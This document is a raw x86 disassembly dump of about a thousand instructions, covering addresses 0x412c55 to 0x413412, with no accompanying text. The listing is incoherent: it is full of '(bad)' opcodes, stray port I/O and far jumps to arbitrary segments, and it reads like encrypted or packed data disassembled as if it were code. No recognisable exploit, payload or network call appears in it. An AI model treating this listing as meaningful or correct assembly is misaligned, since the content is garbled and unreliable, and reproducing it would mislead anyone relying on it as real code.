  412c55:	mov    ?,WORD PTR [edi+0x5c]
  412c58:	out    dx,al
  412c59:	test   eax,0xcdefe17b
  412c5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c5f:	push   es
  412c60:	test   ch,0x3f
  412c63:	push   esi
  412c64:	push   esi
  412c65:	add    eax,0x71f21d6
  412c6a:	dec    eax
  412c6b:	(bad)  
  412c6c:	pop    edi
  412c6d:	sub    edi,DWORD PTR [edx]
  412c6f:	inc    ebx
  412c70:	xor    BYTE PTR ss:[bp+di-0x47],al
  412c75:	lahf   
  412c76:	repz mov ebx,0xd81249fa
  412c7c:	cld    
  412c7d:	shl    cl,0x79
  412c80:	mov    ebp,0x73c8d057
  412c85:	or     ch,BYTE PTR [esi+0x338b76fd]
  412c8b:	push   0x1b
  412c8d:	add    eax,0xe27db2a0
  412c92:	adc    al,0x3a
  412c94:	push   0xd633073d
  412c99:	and    BYTE PTR [edi+0x2038ee6a],ah
  412c9f:	scas   eax,DWORD PTR es:[edi]
  412ca0:	adc    al,0x89
  412ca2:	popf   
  412ca3:	xor    WORD PTR [ebp+0x16],bx
  412ca7:	mov    bh,0x86
  412ca9:	add    al,0x41
  412cab:	repnz ficom DWORD PTR [edx+0x1f]
  412caf:	adc    al,0x39
  412cb1:	fcom   QWORD PTR [ebx+0x1d]
  412cb4:	lods   eax,DWORD PTR ds:[esi]
  412cb5:	jmp    0x30a5adbf
  412cba:	into   
  412cbb:	push   ecx
  412cbc:	fsubrp st(7),st
  412cbe:	or     al,0xec
  412cc0:	int3   
  412cc1:	out    dx,al
  412cc2:	cmp    edx,DWORD PTR [ebx]
  412cc4:	retf   0x5fbb
  412cc7:	push   ebx
  412cc8:	jno    0x412c7d
  412cca:	jl     0x412ce2
  412ccc:	xchg   BYTE PTR [ebx+0x7f],dl
  412ccf:	inc    ebp
  412cd0:	xor    eax,0x6e2af6fb
  412cd5:	cli    
  412cd6:	add    eax,0x2eccda3e
  412cdb:	nop
  412cdc:	loopne 0x412d35
  412cde:	stos   DWORD PTR es:[edi],eax
  412cdf:	test   al,0x94
  412ce1:	jmp    0x412d30
  412ce3:	push   esi
  412ce4:	push   esi
  412ce5:	leave  
  412ce6:	fadd   QWORD PTR [ebx+0x76287c7a]
  412cec:	jg     0x412d3a
  412cee:	jb     0x412d1f
  412cf0:	push   ebp
  412cf1:	bound  eax,QWORD PTR [ebp-0x2b62763a]
  412cf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cf8:	push   cs
  412cf9:	mov    ecx,0x50b14da4
  412cfe:	jns    0x412d56
  412d00:	ja     0x412c9d
  412d02:	das    
  412d03:	push   0xf0aed60
  412d08:	jp     0x412cf8
  412d0a:	mov    al,ds:0x4a8b7c39
  412d0f:	or     ah,BYTE PTR [ecx+0x473619ec]
  412d15:	and    bl,BYTE PTR [esi-0x61]
  412d18:	and    ah,BYTE PTR [edi]
  412d1a:	pop    ebp
  412d1b:	ficom  DWORD PTR [esi-0x2b]
  412d1e:	jmp    0x412d49
  412d20:	outs   dx,BYTE PTR ds:[esi]
  412d21:	adc    al,0x96
  412d23:	jae    0x412d8f
  412d25:	call   0xb0c5:0xcef17f57
  412d2c:	xor    eax,0x607dfcb1
  412d31:	shl    esp,0x2e
  412d34:	adc    eax,edx
  412d36:	or     al,0x9c
  412d38:	ins    DWORD PTR es:[edi],dx
  412d39:	in     al,0x3a
  412d3b:	jo     0x412ce9
  412d3d:	xchg   esp,eax
  412d3e:	jns    0x412d79
  412d40:	stos   BYTE PTR es:[edi],al
  412d41:	push   eax
  412d42:	addr16 push cs
  412d44:	out    dx,al
  412d45:	inc    eax
  412d46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d47:	jmp    0xb57403b8
  412d4c:	dec    ebx
  412d4d:	cmp    BYTE PTR [edx+eax*8-0x601bd9ea],0x66
  412d55:	xchg   edx,eax
  412d56:	jle    0x412dca
  412d58:	mov    ebp,0x97f3060a
  412d5d:	pusha  
  412d5e:	cmp    ebp,ebp
  412d60:	adc    ch,bh
  412d62:	push   edi
  412d63:	ficom  WORD PTR [edi]
  412d65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d66:	cdq    
  412d67:	(bad)  
  412d68:	jo     0x412d20
  412d6a:	adc    ecx,DWORD PTR [eax]
  412d6c:	pop    ds
  412d6d:	mov    dl,0xb4
  412d6f:	cdq    
  412d70:	test   DWORD PTR [ebp+0x582969ae],ecx
  412d76:	and    bh,bl
  412d78:	jle    0x412d74
  412d7a:	mov    eax,ds:0x92c285b7
  412d7f:	clc    
  412d80:	std    
  412d81:	mov    edi,0xb602ba25
  412d86:	inc    ebx
  412d87:	xchg   edx,eax
  412d88:	xlat   BYTE PTR ds:[ebx]
  412d89:	int3   
  412d8a:	stos   DWORD PTR es:[edi],eax
  412d8b:	adc    al,0x21
  412d8d:	sbb    esi,ecx
  412d8f:	sbb    dl,dh
  412d91:	pop    ebx
  412d92:	jno    0x412d4e
  412d94:	ds jno 0x412d26
  412d97:	inc    ebx
  412d98:	and    ah,cl
  412d9a:	or     BYTE PTR [edi-0x50],al
  412d9d:	xor    al,0x12
  412d9f:	mov    ebp,0x7cf53f00
  412da4:	shl    DWORD PTR [eax+eiz*8],1
  412da7:	das    
  412da8:	add    al,0x27
  412daa:	fsub   QWORD PTR [ebp+0x42]
  412dad:	xor    eax,0xb2d69f68
  412db2:	fst    QWORD PTR [edi+0x1f]
  412db5:	outs   dx,BYTE PTR ds:[esi]
  412db6:	loop   0x412ddb
  412db8:	adc    al,BYTE PTR [esi+0x7e]
  412dbb:	mov    DWORD PTR [eax+0x3],esi
  412dbe:	lock add BYTE PTR [ebp-0x47edd9e3],0x9f
  412dc6:	aas    
  412dc7:	pop    edx
  412dc8:	cmc    
  412dc9:	xchg   edx,eax
  412dca:	sub    al,0xf9
  412dcc:	sub    DWORD PTR [eax],0x6f
  412dcf:	xchg   esi,eax
  412dd0:	rol    DWORD PTR [edx+0x6b],cl
  412dd3:	mov    cs:0xf353b60c,al
  412dd9:	arpl   WORD PTR [esi+0xe],di
  412ddc:	inc    esp
  412ddd:	adc    eax,0xd5c328d5
  412de2:	dec    ebp
  412de3:	pop    esp
  412de4:	mov    ds:0x82b6936b,al
  412de9:	dec    edi
  412dea:	repz push cs
  412dec:	(bad)  
  412ded:	stc    
  412dee:	lods   al,BYTE PTR ds:[esi]
  412def:	inc    edi
  412df0:	jmp    0xe853:0x72548be7
  412df7:	jns    0x412db0
  412df9:	rcl    cl,cl
  412dfb:	or     edi,DWORD PTR [ebp+0x33e6bbe5]
  412e01:	lods   al,BYTE PTR ds:[esi]
  412e02:	sub    BYTE PTR [esi-0x6d],dh
  412e05:	ja     0x412de1
  412e07:	popw   ss
  412e09:	pop    esp
  412e0a:	mov    al,0x86
  412e0c:	in     eax,dx
  412e0d:	bound  ecx,QWORD PTR [eax+0x1b7f9960]
  412e13:	cmp    al,0x7c
  412e15:	mov    WORD PTR [edx],?
  412e17:	hlt    
  412e18:	scas   eax,DWORD PTR es:[edi]
  412e19:	xchg   ebp,eax
  412e1a:	add    dl,BYTE PTR [edi-0x1c]
  412e1d:	push   cs
  412e1e:	rol    esp,1
  412e20:	mov    ebx,edi
  412e22:	mov    BYTE PTR [ebx+edx*4],dh
  412e25:	in     eax,0x5f
  412e27:	sbb    eax,0xed08c8a7
  412e2c:	mov    eax,ds:0x7d6f3295
  412e31:	mov    DWORD PTR ds:0x156b51bd,edx
  412e37:	int3   
  412e38:	outs   dx,DWORD PTR ds:[esi]
  412e39:	add    BYTE PTR [ebp-0x5fa0d25e],ch
  412e3f:	add    ah,BYTE PTR [esi+ecx*1-0x1d93d8a0]
  412e46:	mov    ah,0x3c
  412e48:	jl     0x412e82
  412e4a:	dec    eax
  412e4b:	sub    eax,0x9be3463d
  412e50:	sahf   
  412e51:	xchg   BYTE PTR [edi+0x1285106e],al
  412e57:	or     al,0x5d
  412e59:	jl     0x412ddf
  412e5b:	cmp    eax,0x404623a9
  412e60:	lods   eax,DWORD PTR ds:[esi]
  412e61:	rcr    bh,1
  412e63:	lods   al,BYTE PTR ds:[esi]
  412e64:	mov    DWORD PTR ds:0x7abca75a,esi
  412e6a:	jae    0x412eb7
  412e6c:	jl     0x412e3a
  412e6e:	test   eax,0x1d466966
  412e73:	add    al,0x4c
  412e75:	out    0xb7,al
  412e77:	js     0x412eba
  412e79:	mov    bh,0xdb
  412e7b:	(bad)  
  412e7c:	clc    
  412e7d:	fld    QWORD PTR [edx]
  412e7f:	js     0x412e1f
  412e81:	jne    0x412e67
  412e83:	adc    DWORD PTR [edx-0x26562835],ebx
  412e89:	pushf  
  412e8a:	jmp    0x412ea9
  412e8c:	enter  0x4ca0,0xef
  412e90:	jl     0x412e25
  412e92:	xor    ch,BYTE PTR [esi]
  412e94:	dec    esi
  412e95:	cwde   
  412e96:	nop
  412e97:	or     edx,DWORD PTR [eax]
  412e99:	sub    eax,0xa0fd26ac
  412e9e:	sbb    DWORD PTR [edx+edi*1+0x3634e195],edi
  412ea5:	jbe    0x412f25
  412ea7:	dec    esp
  412ea8:	mov    dl,0x27
  412eaa:	push   edi
  412eab:	(bad)  
  412eac:	int    0x57
  412eae:	add    eax,0x77669311
  412eb3:	xadd   DWORD PTR [eax],esp
  412eb6:	xchg   esp,eax
  412eb7:	sub    DWORD PTR [ebx],edi
  412eb9:	pop    esi
  412eba:	dec    ebx
  412ebb:	push   cs
  412ebc:	inc    ecx
  412ebd:	shl    DWORD PTR [edx-0x727897da],1
  412ec3:	dec    ebx
  412ec4:	loop   0x412f32
  412ec6:	mov    ebp,0x248ec93b
  412ecb:	std    
  412ecc:	enter  0x8ce8,0xbf
  412ed0:	stos   BYTE PTR es:[edi],al
  412ed1:	adc    al,0x5a
  412ed3:	sahf   
  412ed4:	retf   0xd913
  412ed7:	xchg   DWORD PTR [eax-0x6d877bd5],ecx
  412edd:	test   DWORD PTR [edx-0x4a],ecx
  412ee0:	aam    0x5e
  412ee2:	mov    cl,0x98
  412ee4:	fcom   DWORD PTR [eax+0x3a]
  412ee7:	in     eax,0xd0
  412ee9:	out    dx,al
  412eea:	xor    DWORD PTR ds:0xe615b998,0x663336af
  412ef4:	ins    DWORD PTR es:[edi],dx
  412ef5:	xor    eax,0x6bf2e8cf
  412efa:	pop    ds
  412efb:	stos   BYTE PTR es:[edi],al
  412efc:	icebp  
  412efd:	call   0x8a631725
  412f02:	inc    edx
  412f03:	loopne 0x412f42
  412f05:	push   ebp
  412f06:	mov    ebx,DWORD PTR [edx+0x4c587139]
  412f0c:	sub    BYTE PTR [ebx-0x10],bl
  412f0f:	mov    fs,WORD PTR [ecx]
  412f11:	sub    DWORD PTR [edx+ebp*2-0x60bf1bef],ecx
  412f18:	dec    ebx
  412f19:	hlt    
  412f1a:	(bad)
  412f1d:	push   edi
  412f1e:	mov    bl,0x39
  412f20:	and    ch,BYTE PTR [esi+edi*1-0x4c]
  412f24:	xor    DWORD PTR [ebx],eax
  412f26:	sbb    eax,0xa342ecae
  412f2b:	call   0x9d3d04e4
  412f30:	jge    0x412f2b
  412f32:	cmp    al,0xe0
  412f34:	lods   al,BYTE PTR ds:[esi]
  412f35:	daa    
  412f36:	inc    ecx
  412f37:	stos   DWORD PTR es:[edi],eax
  412f38:	push   0x3b0612b9
  412f3d:	mov    WORD PTR [ebp-0x2a],ds
  412f40:	jae    0x412f2a
  412f42:	stos   DWORD PTR es:[edi],eax
  412f43:	dec    esp
  412f44:	lods   al,BYTE PTR ds:[esi]
  412f45:	xor    DWORD PTR [esi],0x5e
  412f48:	(bad)  
  412f49:	pusha  
  412f4a:	mov    edx,?
  412f4c:	out    0xa9,al
  412f4e:	add    al,0x1c
  412f50:	adc    DWORD PTR [ecx-0x60a85a73],0x47
  412f57:	lods   al,BYTE PTR ds:[esi]
  412f58:	sbb    BYTE PTR ds:0x1f725d92,0x2b
  412f5f:	into   
  412f60:	inc    esp
  412f61:	sub    BYTE PTR [esi],dh
  412f63:	xchg   edi,eax
  412f64:	or     al,0xbc
  412f66:	cmp    al,0xb5
  412f68:	add    ch,ch
  412f6a:	aas    
  412f6b:	mov    eax,ds:0x43354a3d
  412f70:	arpl   WORD PTR [ebx],ax
  412f72:	outs   dx,BYTE PTR ds:[esi]
  412f73:	ins    DWORD PTR es:[edi],dx
  412f74:	mov    dl,0x5a
  412f76:	dec    edx
  412f77:	inc    edi
  412f78:	scas   al,BYTE PTR es:[edi]
  412f79:	inc    ecx
  412f7a:	mov    ah,al
  412f7c:	das    
  412f7d:	cmp    al,BYTE PTR [edi-0x4dce205b]
  412f83:	pop    ds
  412f84:	sahf   
  412f85:	cmp    ecx,edx
  412f87:	mov    al,ds:0x341eebe1
  412f8c:	add    al,BYTE PTR [edi+0x5b]
  412f8f:	nop
  412f90:	aam    0xc2
  412f92:	cmc    
  412f93:	or     esp,DWORD PTR [ebp-0x41f9d14f]
  412f99:	imul   esi,DWORD PTR [ecx],0x2b
  412f9c:	test   BYTE PTR [ecx-0x7c],ah
  412f9f:	adc    ch,BYTE PTR [ebx-0x5efbd72b]
  412fa5:	dec    ecx
  412fa6:	push   esi
  412fa7:	stc    
  412fa8:	sub    dl,al
  412faa:	cdq    
  412fab:	and    eax,0xe31e7523
  412fb0:	bound  esi,QWORD PTR [ecx+0x1b]
  412fb3:	retf   0xc193
  412fb6:	add    DWORD PTR [edi-0x1b],ecx
  412fb9:	test   DWORD PTR [edi+0x6e70d48e],edx
  412fbf:	out    0xa,eax
  412fc1:	adc    esp,edx
  412fc3:	out    0x29,eax
  412fc5:	xchg   ebx,eax
  412fc6:	dec    edx
  412fc7:	pop    edx
  412fc8:	pop    ecx
  412fc9:	ins    BYTE PTR es:[edi],dx
  412fca:	es stos BYTE PTR es:[edi],al
  412fcc:	cmp    ebx,DWORD PTR [edi-0x7f]
  412fcf:	aam    0x80
  412fd1:	dec    esi
  412fd2:	ins    DWORD PTR es:[edi],dx
  412fd3:	cs call 0xab037cc
  412fd9:	cmp    DWORD PTR [edi+0x16],edx
  412fdc:	popa   
  412fdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fde:	rol    DWORD PTR [edx-0x533cd8bc],cl
  412fe4:	pop    esp
  412fe5:	dec    esi
  412fe6:	pop    esp
  412fe7:	pop    ecx
  412fe8:	jo     0x412fe5
  412fea:	and    al,0xfa
  412fec:	int3   
  412fed:	mov    esp,0x4ee8d3c3
  412ff2:	shl    bl,0x44
  412ff5:	loope  0x412fc1
  412ff7:	adc    eax,0x405eb102
  412ffc:	mov    ebp,0x734ea5c5
  413001:	cli    
  413002:	ret    
  413003:	icebp  
  413004:	iret   
  413005:	cld    
  413006:	std    
  413007:	(bad)  
  413008:	iret   
  413009:	loop   0x412fe7
  41300b:	push   ds
  41300c:	inc    edx
  41300d:	or     eax,0xc8dc0f0f
  413012:	adc    bh,BYTE PTR [esi]
  413014:	repz pusha 
  413016:	cmc    
  413017:	hlt    
  413018:	adc    BYTE PTR [edx+0x60f3266b],cl
  41301e:	mov    ds:0xa0e099ba,al
  413023:	les    eax,FWORD PTR [esi+ebp*4-0x12]
  413027:	daa    
  413028:	lods   al,BYTE PTR ds:[esi]
  413029:	fcom   QWORD PTR [ecx+0x1b07ae4a]
  41302f:	pop    ss
  413030:	or     eax,DWORD PTR [esi]
  413032:	sar    DWORD PTR [edi-0x1201ccaf],1
  413038:	adc    BYTE PTR [esi+0x4e4eae24],ah
  41303e:	ins    BYTE PTR es:[edi],dx
  41303f:	cmp    ebp,0x28
  413042:	out    dx,eax
  413043:	adc    dh,BYTE PTR [edi-0x5c574fcf]
  413049:	sub    DWORD PTR [esi+ebx*4],0x3a
  41304d:	mov    ecx,eax
  41304f:	enter  0xd701,0xf6
  413053:	pop    ebx
  413054:	mov    eax,0x7776a686
  413059:	jl     0x4130a7
  41305b:	or     BYTE PTR [ebp+0x29],dh
  41305e:	push   ecx
  41305f:	xchg   ebp,eax
  413060:	fld    QWORD PTR [edi-0x375c05cf]
  413066:	mov    ss,WORD PTR [edi-0x56]
  413069:	inc    edi
  41306a:	cmp    cl,al
  41306c:	inc    ebp
  41306d:	out    dx,al
  41306e:	dec    esi
  41306f:	dec    ebx
  413070:	repnz xchg esi,eax
  413072:	in     eax,dx
  413073:	cmp    eax,0xb79fcd9e
  413078:	jmp    0x1066:0x821c5252
  41307f:	cwde   
  413080:	mov    dh,0x20
  413082:	adc    BYTE PTR [ebp+0x19],bh
  413085:	mov    DWORD PTR [ecx+0x7f],esi
  413088:	push   edi
  413089:	(bad)  
  41308a:	xchg   edi,eax
  41308b:	(bad)  
  41308c:	retf   0x9f0c
  41308f:	cdq    
  413090:	pop    ebx
  413091:	jnp    0x413102
  413093:	sbb    DWORD PTR ds:0xc392c92f,edx
  413099:	sub    eax,0x7602ba6c
  41309e:	mov    eax,ds:0x73117e05
  4130a3:	mov    dl,0x8
  4130a5:	gs mov edi,gs
  4130a8:	mov    BYTE PTR ds:0xfeea5c2c,bl
  4130af:	and    esi,DWORD PTR [ebx]
  4130b1:	xchg   ecx,eax
  4130b2:	mov    eax,fs:0x27f93387
  4130b8:	mov    dl,0x4b
  4130ba:	jo     0x4130cc
  4130bc:	or     al,BYTE PTR [edx]
  4130be:	dec    edx
  4130bf:	adc    esp,eax
  4130c1:	ss daa 
  4130c3:	rcl    BYTE PTR [ecx],0xf3
  4130c6:	inc    ebx
  4130c7:	pop    ebp
  4130c8:	ret    0x861d
  4130cb:	clc    
  4130cc:	nop
  4130cd:	push   esi
  4130ce:	fiadd  DWORD PTR [edx+ebx*4-0x2804112f]
  4130d5:	pop    esp
  4130d6:	inc    ebx
  4130d7:	cdq    
  4130d8:	rol    dl,1
  4130da:	ss jecxz 0x413080
  4130dd:	sbb    bl,BYTE PTR [edi-0x59]
  4130e0:	pop    esi
  4130e1:	mov    ecx,0x1a5cf1df
  4130e6:	mov    cl,0xe6
  4130e8:	sub    DWORD PTR [eax+0x488b8372],edi
  4130ee:	mov    eax,DWORD PTR [edx]
  4130f0:	ds inc esi
  4130f2:	and    BYTE PTR [edx+0x1a15bf74],dl
  4130f8:	push   ebp
  4130f9:	add    al,0x75
  4130fb:	xchg   esp,eax
  4130fc:	push   ds
  4130fd:	push   ds
  4130fe:	fistp  DWORD PTR [edi*2-0x4fafa1e1]
  413105:	pop    esi
  413106:	inc    ecx
  413107:	xor    cl,BYTE PTR ds:0x392ed8b6
  41310d:	ficom  DWORD PTR [esi+esi*8]
  413110:	ds jg  0x4130a1
  413113:	mov    eax,0x87ebeb7d
  413118:	xchg   ebp,eax
  413119:	dec    esi
  41311a:	mov    esi,0x680c7c92
  41311f:	in     eax,0xbf
  413121:	cwde   
  413122:	adc    al,0x3
  413124:	xor    eax,0x8038868c
  413129:	add    al,0x2f
  41312b:	retf   0x8bb6
  41312e:	pop    esi
  41312f:	arpl   WORD PTR [esi-0x453df72a],sp
  413135:	cmp    eax,0xdce7f66e
  41313a:	dec    esp
  41313b:	push   es
  41313c:	rcl    DWORD PTR [esi],0x61
  41313f:	ds pushf 
  413141:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413142:	in     eax,0x6a
  413144:	shr    dh,cl
  413146:	add    bh,BYTE PTR [eax]
  413148:	mov    bh,0x6d
  41314a:	sub    al,BYTE PTR [eax-0x46c48965]
  413150:	xor    al,0x6a
  413152:	aam    0x9a
  413154:	iret   
  413155:	jle    0x41317d
  413157:	loope  0x41318d
  413159:	sbb    al,0x42
  41315b:	daa    
  41315c:	in     eax,0xac
  41315e:	inc    ecx
  41315f:	add    dh,BYTE PTR [esi+0x45b990da]
  413165:	cmp    al,0x54
  413167:	(bad)  
  413168:	lods   eax,DWORD PTR ds:[esi]
  413169:	retf   0x7912
  41316c:	js     0x413128
  41316e:	add    eax,0xb274dbd1
  413173:	pop    ebp
  413174:	mov    DWORD PTR [ecx+0x23],ebp
  413177:	add    al,0xc6
  413179:	mov    ebx,ecx
  41317b:	js     0x413128
  41317d:	add    esp,edx
  41317f:	push   ebp
  413180:	les    ecx,FWORD PTR [esi-0x67]
  413183:	ror    BYTE PTR [edx],cl
  413185:	jnp    0x4131f7
  413187:	call   0x566:0x256d736
  41318e:	fs pusha 
  413190:	mov    dl,BYTE PTR [edx-0x76946eee]
  413196:	and    al,0xf8
  413198:	test   BYTE PTR ds:0x651255b3,dl
  41319e:	sub    eax,0x5a794b8f
  4131a3:	das    
  4131a4:	push   ecx
  4131a5:	imul   edx,eax,0x2999a575
  4131ab:	lods   al,BYTE PTR ds:[esi]
  4131ac:	shr    esp,cl
  4131ae:	cmp    eax,ebx
  4131b0:	add    edx,DWORD PTR [edx+ebp*1]
  4131b3:	ret    
  4131b4:	ins    BYTE PTR es:[edi],dx
  4131b5:	push   esi
  4131b6:	int    0x39
  4131b8:	push   cs
  4131b9:	jecxz  0x4131d5
  4131bb:	call   0xd698:0xdef74786
  4131c2:	inc    ecx
  4131c3:	pop    ebx
  4131c4:	call   0xe103fb2c
  4131c9:	stc    
  4131ca:	das    
  4131cb:	jle    0x41322d
  4131cd:	rcl    dh,0xae
  4131d0:	or     ebx,DWORD PTR [ebp+0x7]
  4131d3:	dec    edi
  4131d4:	pop    edx
  4131d5:	push   ebx
  4131d6:	pushf  
  4131d7:	jle    0x4131c4
  4131d9:	and    eax,0xd24d286b
  4131de:	lods   al,BYTE PTR ds:[esi]
  4131df:	and    DWORD PTR [edi-0x3],ecx
  4131e2:	clc    
  4131e3:	adc    edx,DWORD PTR [esi-0x61]
  4131e6:	sbb    al,0x8c
  4131e8:	push   ebx
  4131e9:	inc    edx
  4131ea:	popa   
  4131eb:	in     eax,0x13
  4131ed:	or     ecx,DWORD PTR [edi-0x47]
  4131f0:	adc    ch,ch
  4131f2:	les    ebp,FWORD PTR [eax+ebp*2+0x33]
  4131f6:	xchg   edi,eax
  4131f7:	or     bl,0x7d
  4131fa:	xchg   esp,eax
  4131fb:	jecxz  0x41327b
  4131fd:	jg     0x41318c
  4131ff:	or     esi,DWORD PTR [ecx-0x55aa32dd]
  413205:	les    ebp,FWORD PTR [esi]
  413207:	push   ss
  413208:	jns    0x413199
  41320a:	jo     0x4131b3
  41320c:	shl    BYTE PTR [ebx],0x74
  41320f:	or     al,0x2c
  413211:	xor    al,0xb1
  413213:	(bad)  
  413214:	mov    ecx,gs
  413216:	or     al,0x1e
  413218:	sbb    edx,DWORD PTR [ebx-0x384118a2]
  41321e:	inc    eax
  41321f:	(bad)  
  413221:	retf   
  413222:	jno    0x41321c
  413224:	enter  0x9daf,0x65
  413228:	dec    edx
  413229:	nop
  41322a:	mov    ecx,0xb617394c
  41322f:	or     ebx,esi
  413231:	imul   edi,DWORD PTR [esi-0x8],0xd3f39005
  413238:	mov    ebx,0xb6f3d888
  41323d:	cmp    BYTE PTR [eax],bh
  41323f:	mov    ebx,0x8134cdf1
  413244:	rcr    esi,0x14
  413247:	fiadd  WORD PTR [ecx+0x43]
  41324a:	cmp    eax,0x78c010fa
  41324f:	add    ch,dh
  413251:	xchg   DWORD PTR [eax+0x17da01bc],ebp
  413257:	adc    eax,0x6f89e79c
  41325c:	and    esp,DWORD PTR [edx+0x2b7e027d]
  413262:	inc    eax
  413263:	sub    esp,DWORD PTR [ecx]
  413265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413266:	xor    eax,0x52d66c19
  41326b:	jnp    0x4132a5
  41326d:	pop    eax
  41326e:	fsub   DWORD PTR [ecx-0x45]
  413271:	mov    esi,DWORD PTR [edx+0x2495f4c0]
  413277:	xchg   edi,eax
  413278:	adc    dl,bh
  41327a:	(bad)  
  41327b:	mov    esi,0x2d738b81
  413280:	lahf   
  413281:	pop    esi
  413282:	mov    eax,ds:0xe37119bb
  413287:	in     al,0x2d
  413289:	addr16 cwde 
  41328b:	jecxz  0x413290
  41328d:	les    eax,FWORD PTR [esi+edi*4+0x4a]
  413291:	pushf  
  413292:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413293:	sti    
  413294:	pop    esp
  413295:	cmp    dl,ah
  413297:	ja     0x413245
  413299:	popf   
  41329a:	repz pop edx
  41329c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41329d:	jl     0x413268
  41329f:	mov    ds:0xdb09cad4,al
  4132a4:	sub    DWORD PTR [edx],ebp
  4132a6:	fucomp st(5)
  4132a8:	(bad)  
  4132a9:	into   
  4132aa:	sub    bl,al
  4132ac:	cs test eax,0x691c56c2
  4132b2:	push   edx
  4132b3:	int    0x1c
  4132b5:	rol    BYTE PTR [ebp+0x61],0x4d
  4132b9:	push   edx
  4132ba:	jg     0x41325c
  4132bc:	jo     0x4132bb
  4132be:	inc    esp
  4132bf:	push   ebx
  4132c0:	scas   eax,DWORD PTR es:[edi]
  4132c1:	(bad)  
  4132c2:	enter  0x66f3,0x18
  4132c6:	out    dx,eax
  4132c7:	lods   al,BYTE PTR ds:[esi]
  4132c8:	mov    DWORD PTR [eax+0x27],ecx
  4132cb:	cwde   
  4132cc:	sub    al,0x4c
  4132ce:	mov    al,ds:0x9bba0277
  4132d3:	fcomip st,st(2)
  4132d5:	lea    esi,[esi]
  4132d7:	mov    eax,ds:0x9033ea6e
  4132dc:	aaa    
  4132dd:	mov    ds:0xb6e6eb2b,al
  4132e2:	call   0xc6f1:0xf9a0f10
  4132e9:	pop    ss
  4132ea:	in     al,dx
  4132eb:	xlat   BYTE PTR ds:[ebx]
  4132ec:	mov    BYTE PTR [ecx+eiz*4-0x66],ch
  4132f0:	enter  0xfc2b,0x2b
  4132f4:	rcl    BYTE PTR [esi-0x34],1
  4132f7:	jbe    0x413349
  4132f9:	xchg   ebx,eax
  4132fa:	sub    bl,dh
  4132fc:	jl     0x413281
  4132fe:	xchg   edi,eax
  4132ff:	mov    ebp,0x77ea6393
  413304:	or     esi,ebx
  413306:	xor    al,0x57
  413308:	xchg   ebx,eax
  413309:	add    edx,edi
  41330b:	aas    
  41330c:	inc    esi
  41330d:	je     0x413360
  41330f:	(bad)  [ebp-0x54]
  413312:	(bad)  
  413313:	bnd js 0x41336f
  413316:	push   0x73059bde
  41331b:	je     0x413378
  41331d:	cmc    
  41331e:	mov    al,ds:0x74dcfc9
  413323:	cmp    eax,0x7e9a5ec0
  413328:	add    BYTE PTR [esi-0x776234b2],al
  41332e:	imul   eax,DWORD PTR [ebx-0x69],0xffffffac
  413332:	pop    esi
  413333:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413334:	call   0x6c7a6a8e
  413339:	pop    es
  41333a:	pop    edx
  41333b:	pop    ecx
  41333c:	cld    
  41333d:	mov    dh,0x3e
  41333f:	mov    ecx,0xd909b4e6
  413344:	mov    al,ds:0x2995a2b3
  413349:	retf   
  41334a:	pusha  
  41334b:	pop    ebp
  41334c:	ret    
  41334d:	dec    edi
  41334e:	int3   
  41334f:	and    DWORD PTR [eax+esi*8+0x46075973],0xffffffc3
  413357:	int    0x1a
  413359:	icebp  
  41335a:	xchg   esp,eax
  41335b:	ret    0x4e10
  41335e:	jno    0x413359
  413360:	pushf  
  413361:	mov    cs,esi
  413363:	inc    edi
  413364:	adc    eax,0xf660750b
  413369:	xchg   BYTE PTR [esi+0x77cfe6e4],al
  41336f:	in     eax,dx
  413370:	xchg   edi,eax
  413371:	mov    ebx,0x4110403b
  413376:	ss ins DWORD PTR es:[edi],dx
  413378:	adc    al,0xa9
  41337a:	add    eax,0x4dc389ac
  41337f:	mov    esp,0x53bd42cb
  413384:	add    eax,0x50ac90c0
  413389:	arpl   WORD PTR [ebp+0x47],si
  41338c:	mov    es,WORD PTR [ecx]
  41338e:	jne    0x41340f
  413390:	mov    dl,0xe7
  413392:	ins    DWORD PTR es:[edi],dx
  413393:	xchg   DWORD PTR gs:[ecx-0x30de3987],edx
  41339a:	adc    ecx,ecx
  41339c:	daa    
  41339d:	out    0x6f,al
  41339f:	dec    eax
  4133a0:	iret   
  4133a1:	mov    esi,0x1dc8982
  4133a6:	pop    ss
  4133a7:	jg     0x41340d
  4133a9:	call   0x333c3893
  4133ae:	push   ebp
  4133af:	jmp    0x9ee7638f
  4133b4:	mov    ds:0x15f0df1c,al
  4133b9:	mov    edi,0xbdf0728d
  4133be:	xchg   edi,eax
  4133bf:	das    
  4133c0:	ja     0x413399
  4133c2:	cmp    BYTE PTR [edx+0x56],bh
  4133c5:	outs   dx,BYTE PTR ds:[esi]
  4133c6:	pop    ebx
  4133c7:	dec    ecx
  4133c8:	push   ecx
  4133c9:	or     edi,edx
  4133cb:	cwde   
  4133cc:	push   cs
  4133cd:	push   edx
  4133ce:	and    DWORD PTR [eax+0x6a5f9949],ebp
  4133d4:	std    
  4133d5:	fxch   st(4)
  4133d7:	mov    al,ds:0x4ae2beb7
  4133dc:	mov    ah,0x93
  4133de:	shl    DWORD PTR [edi+0x4caf147e],1
  4133e4:	pop    ebp
  4133e5:	pop    ss
  4133e6:	mov    esi,0xa9d919e8
  4133eb:	sub    al,0x2
  4133ed:	bound  ebx,QWORD PTR [esi-0x78a02d40]
  4133f3:	push   0x26
  4133f5:	lea    ecx,[esi-0x3c]
  4133f8:	scas   eax,DWORD PTR es:[edi]
  4133f9:	in     al,0x58
  4133fb:	arpl   WORD PTR [edx],sp
  4133fd:	out    dx,eax
  4133fe:	data16 jg 0x4133ad
  413401:	xchg   dh,bl
  413403:	fnstcw WORD PTR [ebx+ecx*8-0x1a59326f]
  41340a:	jg     0x4133bf
  41340c:	inc    edx
  41340d:	(bad)  
  41340e:	lahf   
  41340f:	lods   al,BYTE PTR ds:[esi]
  413410:	les    esi,FWORD PTR [ebx]
  413412:	fcomp  DWORD PTR [esi]
